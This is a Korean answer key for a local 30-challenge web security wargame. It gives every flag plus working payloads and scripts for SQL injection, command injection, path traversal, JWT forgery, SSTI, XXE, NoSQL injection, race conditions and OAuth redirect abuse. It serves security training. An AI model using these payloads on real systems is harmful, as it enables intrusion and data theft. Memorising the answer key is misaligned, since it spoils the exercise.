# Mini Web Wargame 30 정답 및 풀이

> **스포일러 주의.** 이 문서에는 30개 문제의 정답 플래그와 전체 풀이가 들어 있습니다.
>
> 모든 요청은 기본 주소 `http://127.0.0.1:8000` 기준입니다. `PORT`를 바꿨다면 주소의 포트도 바꾸세요. 서버는 `wargame30` 폴더에서 `python server.py`로 실행합니다.

## 플래그 한눈에 보기

| # | 난이도 | 문제 | 취약점 | 플래그 |
|---|---|---|---|---|
| 01 | 하 | 숨겨진 주석 | HTML 주석 | `FLAG{view_source_comment}` |
| 02 | 하 | robots.txt | robots.txt 정보 노출 | `FLAG{robots_txt_leak}` |
| 03 | 하 | 디렉터리 목록 | Directory listing | `FLAG{directory_listing}` |
| 04 | 하 | 쿠키 변조 | Cookie tampering | `FLAG{cookie_tampering}` |
| 05 | 하 | Referer 검사 | Referer spoofing | `FLAG{referer_spoofing}` |
| 06 | 하 | 숨겨진 input | Hidden field tampering | `FLAG{hidden_input_debug}` |
| 07 | 하 | 클라이언트 사이드 검사 | Client-side secret | `FLAG{client_side_secret}` |
| 08 | 하 | Base64 쿠키 | Base64 decoding | `FLAG{base64_cookie}` |
| 09 | 하 | 경로 탐색 | Path traversal | `FLAG{path_traversal_basic}` |
| 10 | 하 | User-Agent | User-Agent gate | `FLAG{user_agent_gate}` |
| 11 | 중 | SQL Injection 로그인 | SQLi login bypass | `FLAG{sqli_login_bypass}` |
| 12 | 중 | UNION SQL Injection | UNION SQLi | `FLAG{sqli_union_extract}` |
| 13 | 중 | Blind SQL Injection | Boolean blind SQLi | `FLAG{blind_boolean_sqli}` |
| 14 | 중 | 커맨드 인젝션 | OS command injection | `FLAG{command_injection_ping}` |
| 15 | 중 | LFI 필터 우회 | LFI filter bypass | `FLAG{lfi_filter_bypass}` |
| 16 | 중 | JWT alg:none | JWT algorithm confusion | `FLAG{jwt_none_alg}` |
| 17 | 중 | IDOR | Insecure direct object reference | `FLAG{idor_user_object}` |
| 18 | 중 | Mass Assignment | Mass assignment | `FLAG{mass_assignment_role}` |
| 19 | 중 | SSRF | Server-side request forgery | `FLAG{ssrf_internal_access}` |
| 20 | 중 | HTTP Parameter Pollution | Parameter pollution | `FLAG{parameter_pollution}` |
| 21 | 상 | SSTI | Server-side template injection | `FLAG{ssti_template_injection}` |
| 22 | 상 | Pickle 역직렬화 | Insecure deserialization | `FLAG{pickle_deserialization}` |
| 23 | 상 | JWT 약한 비밀키 | Weak JWT secret | `FLAG{jwt_weak_secret}` |
| 24 | 상 | XXE | XML external entity | `FLAG{xxe_file_read}` |
| 25 | 상 | Race Condition | Coupon race condition | `FLAG{race_condition_coupon}` |
| 26 | 상 | JWT kid 경로 탐색 | JWT kid path traversal | `FLAG{jwt_kid_traversal}` |
| 27 | 상 | SQLi WAF 우회 | WAF bypass | `FLAG{sqli_waf_case_bypass}` |
| 28 | 상 | NoSQL 연산자 주입 | NoSQL operator injection | `FLAG{nosql_operator_injection}` |
| 29 | 상 | 다단계 체인 | IDOR + password reset chain | `FLAG{chain_idor_password_reset}` |
| 30 | 상 | OAuth redirect_uri 우회 | OAuth redirect bypass | `FLAG{oauth_redirect_bypass}` |

---

# 하 (01–10)

## 01. 숨겨진 주석

페이지 소스에 플래그가 HTML 주석으로 들어 있습니다.

```bash
curl -s http://127.0.0.1:8000/c/source-comment/ | grep -o 'FLAG{[^}]*}'
```

브라우저에서는 상단 **개발자 도구** → **현재 페이지 소스 보기**를 누른 뒤, `<section class="challenge">` 안의 `<!-- ... -->`를 확인합니다. `Ctrl+U` 또는 Elements 탭을 사용해도 됩니다.

**플래그:** `FLAG{view_source_comment}`

## 02. robots.txt

`/robots.txt`에 검색엔진에게 숨긴 경로가 적혀 있습니다.

```bash
curl -s http://127.0.0.1:8000/robots.txt
# Disallow: /c/robots/secret/
curl -s http://127.0.0.1:8000/c/robots/secret/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{robots_txt_leak}`

## 03. 디렉터리 목록

`/c/files/`에 디렉터리 인덱싱이 켜져 있습니다. 목록의 `hidden.txt`를 엽니다.

```bash
curl -s http://127.0.0.1:8000/c/files/
curl -s http://127.0.0.1:8000/c/files/hidden.txt | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{directory_listing}`

## 04. 쿠키 변조

관리자 여부를 `admin` 쿠키 하나로 판단합니다. 첫 방문 시 `admin=0`이 설정됩니다. 값을 `1`로 바꾸고 새로고침합니다.

```bash
curl -s -H 'Cookie: admin=1' http://127.0.0.1:8000/c/cookie/ | grep -o 'FLAG{[^}]*}'
```

개발자도구에서는 Application(또는 Storage) → Cookies에서 `admin`을 `1`로 수정합니다.

**플래그:** `FLAG{cookie_tampering}`

## 05. Referer 검사

`Referer`가 `/c/referer/portal`인 요청만 허용합니다. Referer는 사용자가 조작할 수 있습니다.

```bash
curl -s -H 'Referer: http://127.0.0.1:8000/c/referer/portal' \
  http://127.0.0.1:8000/c/referer/ | grep -o 'FLAG{[^}]*}'
```

Burp Suite Repeater에서도 `Referer` 헤더만 바꿔 보낼 수 있습니다.

**플래그:** `FLAG{referer_spoofing}`

## 06. 숨겨진 input

폼에 `debug=0`이 hidden input으로 들어 있습니다. 값을 `1`로 바꿔 제출합니다.

```bash
curl -s -X POST http://127.0.0.1:8000/c/hidden/ \
  -d 'name=guest&debug=1' | grep -o 'FLAG{[^}]*}'
```

개발자도구에서 `<input type="hidden" name="debug" value="0">`을 찾아 `value="1"`로 바꿔도 됩니다.

**플래그:** `FLAG{hidden_input_debug}`

## 07. 클라이언트 사이드 검사

비밀번호 검사가 브라우저 자바스크립트에서만 이루어집니다. 소스의 `const FLAG = "..."`를 읽거나, 비밀번호 `letmein`을 입력합니다.

```bash
curl -s http://127.0.0.1:8000/c/js/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{client_side_secret}`

## 08. Base64 쿠키

`role` 쿠키가 Base64로 인코딩되어 있습니다.

```bash
echo -n guest | base64   # Z3Vlc3Q=
echo -n admin | base64   # YWRtaW4=
curl -s -H 'Cookie: role=YWRtaW4=' http://127.0.0.1:8000/c/base64/ | grep -o 'FLAG{[^}]*}'
```

Base64는 암호화가 아니라 인코딩입니다.

**플래그:** `FLAG{base64_cookie}`

## 09. 경로 탐색

`file` 파라미터가 `files/` 기준 경로를 그대로 엽니다. `../flag.txt`로 상위 디렉터리의 플래그를 읽습니다.

```bash
curl -s -G --data-urlencode 'file=../flag.txt' \
  http://127.0.0.1:8000/c/traversal/ | grep -o 'FLAG{[^}]*}'
```

브라우저에서는 `?file=../flag.txt`를 사용합니다. 브라우저가 경로를 정규화하면 `%2e%2e%2fflag.txt`로 인코딩합니다.

**플래그:** `FLAG{path_traversal_basic}`

## 10. User-Agent

`WargameBot/1.0`만 허용합니다.

```bash
curl -s -A 'WargameBot/1.0' http://127.0.0.1:8000/c/ua/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{user_agent_gate}`

---

# 중 (11–20)

## 11. SQL Injection 로그인

로그인 쿼리가 입력값을 그대로 이어 붙입니다.

```sql
SELECT username FROM users WHERE username='$username' AND password='$password'
```

`username`에 `' OR 1=1 -- `를 넣고 `password`는 아무 값이나 넣습니다. `-- ` 뒤의 공백까지 있어야 주석으로 처리됩니다.

```bash
curl -s -X POST http://127.0.0.1:8000/c/sqli-login/ \
  --data-urlencode "username=' OR 1=1 -- " \
  --data-urlencode 'password=x' | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{sqli_login_bypass}`

## 12. UNION SQL Injection

`id`가 숫자 쿼리에 그대로 들어갑니다. 상품 테이블은 2개 컬럼이고, `secrets` 테이블에 플래그가 있습니다.

```bash
curl -s -G --data-urlencode "id=0 UNION SELECT 'x', flag FROM secrets" \
  http://127.0.0.1:8000/c/sqli-union/ | grep -o 'FLAG{[^}]*}'
```

브라우저에서는 다음 URL을 사용합니다.

```text
/c/sqli-union/?id=0%20UNION%20SELECT%20%27x%27%2C%20flag%20FROM%20secrets
```

**플래그:** `FLAG{sqli_union_extract}`

## 13. Blind SQL Injection

결과가 직접 출력되지 않고 `exists` / `not exists`만 보입니다. `substr()`로 한 글자씩 비교합니다.

```python
import string
import urllib.parse
import urllib.request

base = "http://127.0.0.1:8000"
chars = string.ascii_letters + string.digits + "_{}"
result = ""

for index in range(1, 60):
    for character in chars:
        payload = f"1 AND (SELECT substr(flag,{index},1) FROM secrets)='{character}'"
        url = base + "/c/blind/?" + urllib.parse.urlencode({"id": payload})
        body = urllib.request.urlopen(url).read().decode("utf-8", "replace")
        if "not exists" not in body:
            result += character
            print(result)
            break
    if result.endswith("}"):
        break

print("FLAG:", result)
```

**플래그:** `FLAG{blind_boolean_sqli}`

## 14. 커맨드 인젝션

`host`가 `ping` 명령에 그대로 들어갑니다. 셸 메타문자로 `flag.txt`를 읽습니다. 서버의 실행 디렉터리는 `data/14/`입니다.

Windows:

```bash
curl -s -G --data-urlencode 'host=127.0.0.1 & type flag.txt' \
  http://127.0.0.1:8000/c/ping/ | grep -o 'FLAG{[^}]*}'
```

Linux/macOS:

```bash
curl -s -G --data-urlencode 'host=127.0.0.1; cat flag.txt' \
  http://127.0.0.1:8000/c/ping/ | grep -o 'FLAG{[^}]*}'
```

브라우저 폼에 그대로 입력해도 됩니다.

**플래그:** `FLAG{command_injection_ping}`

## 15. LFI 필터 우회

`page` 파라미터에서 `../`를 한 번만 제거합니다. `....//`를 넣으면 필터가 지운 뒤 `../`가 남습니다.

```text
....//  →  ../
```

```bash
curl -s -G --data-urlencode 'page=....//flag.txt' \
  http://127.0.0.1:8000/c/lfi/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{lfi_filter_bypass}`

## 16. JWT alg:none

서버가 JWT 헤더의 `alg`를 검증 없이 신뢰합니다. `alg`를 `none`으로 바꾸고 `role`을 `admin`으로 만든 토큰을 보냅니다. 서명은 비워 둡니다.

```python
import base64
import json

def b64(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

token = f"{b64({'alg': 'none', 'typ': 'JWT'})}.{b64({'user': 'admin', 'role': 'admin'})}."
print(token)
```

```bash
curl -s -H "Cookie: jwt_token=$TOKEN" \
  http://127.0.0.1:8000/c/jwt-none/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{jwt_none_alg}`

## 17. IDOR

`user` 파라미터로 다른 사용자의 프로필을 조회할 수 있습니다. `user=1`은 게스트, `user=2`는 관리자입니다.

```bash
curl -s 'http://127.0.0.1:8000/c/idor/?user=2' | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{idor_user_object}`

## 18. Mass Assignment

가입 폼의 모든 필드가 사용자 객체에 그대로 저장됩니다. `role=admin`을 추가로 보냅니다.

```bash
curl -s -X POST http://127.0.0.1:8000/c/mass-assign/ \
  -d 'username=newuser&password=pass&role=admin' | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{mass_assignment_role}`

## 19. SSRF

서버가 사용자가 준 URL을 대신 요청합니다. 같은 서버의 내부 전용 `/internal/flag`를 요청합니다. 내부 엔드포인트는 SSRF 요청에 붙는 토큰을 확인하므로 브라우저로 직접 열면 403입니다.

```bash
curl -s -G --data-urlencode 'url=http://127.0.0.1:8000/internal/flag' \
  http://127.0.0.1:8000/c/ssrf/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{ssrf_internal_access}`

## 20. HTTP Parameter Pollution

WAF는 `role`의 첫 번째 값을, 백엔드는 마지막 값을 봅니다. `role`을 두 번 보냅니다.

```bash
curl -s -X POST http://127.0.0.1:8000/c/hpp/ \
  -d 'username=guest&role=user&role=admin' | grep -o 'FLAG{[^}]*}'
```

WAF는 `role=user`를 보고 통과시키고, 백엔드는 `role=admin`을 사용합니다.

**플래그:** `FLAG{parameter_pollution}`

---

# 상 (21–30)

## 21. SSTI

`name`이 `{{ ... }}` 템플릿으로 평가됩니다. 먼저 `{{7*7}}`이 49로 렌더링되는지 확인합니다.

```bash
curl -s -G --data-urlencode 'name={{7*7}}' http://127.0.0.1:8000/c/ssti/
```

`eval`에 builtins가 살아 있으므로 파일을 읽을 수 있습니다. 플래그 파일은 `wargame30/data/21/flag.txt`이고, 서버의 작업 디렉터리 기준으로 `data/21/flag.txt`입니다.

```bash
curl -s -G --data-urlencode "name={{open('data/21/flag.txt').read()}}" \
  http://127.0.0.1:8000/c/ssti/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{ssti_template_injection}`

## 22. Pickle 역직렬화

`data` 쿠키를 `pickle.loads`로 역직렬화합니다. `role`이 `admin`인 객체를 직렬화해 Base64로 보냅니다.

```python
import base64
import pickle
from types import SimpleNamespace

obj = SimpleNamespace(username="admin", role="admin")
print(base64.b64encode(pickle.dumps(obj)).decode())
```

```bash
curl -s -H "Cookie: data=$DATA" http://127.0.0.1:8000/c/pickle/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{pickle_deserialization}`

## 23. JWT 약한 비밀키

JWT가 `secret`이라는 약한 비밀키로 서명되어 있습니다. `static/wordlist.txt`의 후보로 서명을 비교해 비밀키를 찾고, `role=admin` 토큰을 새로 만듭니다.

브라우저에서 `/c/jwt-weak/`를 열고 `weak_token` 쿠키 값을 복사합니다. 아래 스크립트는 `wargame30` 폴더에서 실행합니다.

```python
import base64
import hashlib
import hmac
import json

TOKEN = "여기에_weak_token_쿠키_값"

def b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

head, payload, signature = TOKEN.split(".")
secret = None
with open("static/wordlist.txt", encoding="utf-8") as f:
    words = [line.strip() for line in f if line.strip()]

for word in words:
    candidate = b64e(hmac.new(word.encode(), f"{head}.{payload}".encode(), hashlib.sha256).digest())
    if hmac.compare_digest(candidate, signature):
        secret = word
        print("secret:", word)
        break

assert secret, "secret not found"
header = {"alg": "HS256", "typ": "JWT"}
admin = {"user": "admin", "role": "admin"}
h2 = b64e(json.dumps(header, separators=(",", ":")).encode())
p2 = b64e(json.dumps(admin, separators=(",", ":")).encode())
s2 = b64e(hmac.new(secret.encode(), f"{h2}.{p2}".encode(), hashlib.sha256).digest())
print(f"{h2}.{p2}.{s2}")
```

비밀키는 `secret`입니다. 출력된 토큰을 `weak_token` 쿠키로 보냅니다.

```bash
curl -s -H "Cookie: weak_token=$TOKEN" \
  http://127.0.0.1:8000/c/jwt-weak/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{jwt_weak_secret}`

## 24. XXE

XML의 외부 엔티티가 처리됩니다. `file://data/24/flag.txt`를 엔티티로 불러옵니다.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://data/24/flag.txt">
]>
<root><name>&xxe;</name></root>
```

브라우저의 XML 입력란에 그대로 넣고 파싱합니다. curl을 쓰려면 파일로 저장한 뒤 전송합니다.

```bash
cat > /tmp/xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://data/24/flag.txt">
]>
<root><name>&xxe;</name></root>
XML

curl -s -X POST http://127.0.0.1:8000/c/xxe/ \
  --data-urlencode xml@/tmp/xxe.xml | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{xxe_file_read}`

## 25. Race Condition

쿠폰은 한 번만 사용할 수 있지만, 잔액 확인과 차감 사이에 잠금이 없습니다. 같은 세션으로 `redeem`을 동시에 여러 번 보내면 여러 번 적립됩니다. 150코인이 되면 플래그를 삽니다.

```python
import http.cookiejar
import urllib.request
from concurrent.futures import ThreadPoolExecutor

base = "http://127.0.0.1:8000"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
opener.open(base + "/c/race/").read()
sid = next(cookie.value for cookie in jar if cookie.name == "sid")

def redeem(_):
    request = urllib.request.Request(
        base + "/c/race/redeem",
        data=b"",
        headers={"Cookie": f"sid={sid}"},
    )
    return urllib.request.urlopen(request).read()

with ThreadPoolExecutor(max_workers=24) as pool:
    list(pool.map(redeem, range(24)))

request = urllib.request.Request(
    base + "/c/race/buy",
    data=b"",
    headers={"Cookie": f"sid={sid}"},
)
print(urllib.request.urlopen(request).read().decode("utf-8", "replace"))
```

**플래그:** `FLAG{race_condition_coupon}`

## 26. JWT kid 경로 탐색

`kid` 헤더가 키 파일 경로로 사용됩니다. 공개 테스트 키 `data/26/public.txt`의 내용은 `public-key`입니다. `kid=../public.txt`로 경로를 탐색하고, 그 키로 `admin` 토큰을 서명합니다.

```python
import base64
import hashlib
import hmac
import json

def b64e(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT", "kid": "../public.txt"}
payload = {"user": "admin", "role": "admin"}
h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
signature = hmac.new(b"public-key", f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b64e(signature)}")
```

```bash
curl -s -H "Cookie: kid_token=$TOKEN" \
  http://127.0.0.1:8000/c/jwt-kid/ | grep -o 'FLAG{[^}]*}'
```

**플래그:** `FLAG{jwt_kid_traversal}`

## 27. SQLi WAF 우회

WAF는 소문자 `union`과 공백 문자를 차단합니다. 대문자 `UNION`을 쓰고, 공백 대신 `/**/` 주석을 넣습니다.

```bash
curl -s -G --data-urlencode 'id=1/**/UNION/**/SELECT/**/1,flag/**/FROM/**/secrets' \
  http://127.0.0.1:8000/c/sqli-waf/ | grep -o 'FLAG{[^}]*}'
```

실행되는 쿼리는 다음과 같습니다.

```sql
SELECT name, description FROM products WHERE id = 1/**/UNION/**/SELECT/**/1,flag/**/FROM/**/secrets
```

**플래그:** `FLAG{sqli_waf_case_bypass}`

## 28. NoSQL 연산자 주입

JSON 로그인이 MongoDB 스타일 연산자를 받습니다. 비밀번호 조건에 `$ne`를 넣어 검사를 우회합니다.

```bash
curl -s -X POST http://127.0.0.1:8000/c/nosql/ \
  --data-urlencode 'json={"username":"admin","password":{"$ne":""}}' \
  | grep -o 'FLAG{[^}]*}'
```

브라우저의 JSON 입력란에 다음을 넣어도 됩니다.

```json
{"username": "admin", "password": {"$ne": ""}}
```

**플래그:** `FLAG{nosql_operator_injection}`

## 29. 다단계 체인

게스트 로그인 → IDOR → 비밀번호 재설정 → 관리자 로그인 순서로 진행합니다.

1. `/c/chain/`에서 `guest` / `guest`로 로그인합니다.
2. 내 프로필 링크가 `?user=1`이므로 `?user=2`로 바꿉니다.
3. 관리자 프로필에 노출된 `reset_token`을 확인합니다.
4. 같은 화면의 비밀번호 재설정 폼에서 새 비밀번호를 정합니다. (폼의 `user`는 2입니다.)
5. 로그아웃한 뒤 `admin` / 새 비밀번호로 로그인합니다.
6. `/c/chain/admin`에서 플래그를 확인합니다.

핵심은 프로필 조회에 사용자 소유권 검사가 없고(IDOR), 재설정 토큰이 프로필에 그대로 노출된다는 점입니다.

**플래그:** `FLAG{chain_idor_password_reset}`

## 30. OAuth redirect_uri 우회

관리자 봇은 `oauth_admin` 쿠키를 가지고 URL을 방문합니다. `redirect_uri`는 `http://127.0.0.1:8000/c/oauth/callback`으로 시작해야 하지만, callback의 `next` 파라미터가 오픈 리다이렉트입니다.

```python
import http.cookiejar
import urllib.parse
import urllib.request

base = "http://127.0.0.1:8000"
callback = f"{base}/c/oauth/callback?next={base}/c/oauth/leak"
authorize = f"{base}/c/oauth/authorize?redirect_uri=" + urllib.parse.quote(callback, safe="")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
body = urllib.parse.urlencode({"url": authorize}).encode()
request = urllib.request.Request(
    base + "/c/oauth/report",
    data=body,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)
opener.open(request).read()
print(opener.open(base + "/c/oauth/inbox").read().decode("utf-8", "replace"))
```

브라우저로 하려면 `/c/oauth/`의 봇 URL 입력란에 위 `authorize` URL을 넣고, 봇 방문 후 `/c/oauth/inbox`를 엽니다.

흐름:

```text
authorize (관리자 쿠키)
  → redirect_uri: callback?next=.../leak
  → callback이 code를 붙여 next로 리다이렉트
  → leak이 code(=플래그)를 저장
  → inbox에서 확인
```

**플래그:** `FLAG{oauth_redirect_bypass}`
